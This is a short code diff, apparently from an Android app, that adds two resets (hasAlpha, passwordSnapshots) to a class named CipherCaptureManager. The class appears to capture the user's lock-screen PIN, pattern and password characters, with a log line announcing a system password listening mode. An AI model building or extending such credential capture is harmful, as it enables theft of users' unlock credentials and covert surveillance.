@@ -331,6 +331,9 @@ class CipherCaptureManager(
             manager.patternDetected = false
             manager.pinDigits.clear()
             manager.passwordChars.clear()
+            // Bug 6 fix: also clear hasAlpha and passwordSnapshots to prevent stale data
+            manager.hasAlpha = false
+            manager.passwordSnapshots.clear()
             manager.lastEventTime = 0L
 
             Log.d(TAG, "✅ 启用系统密码监听模式")
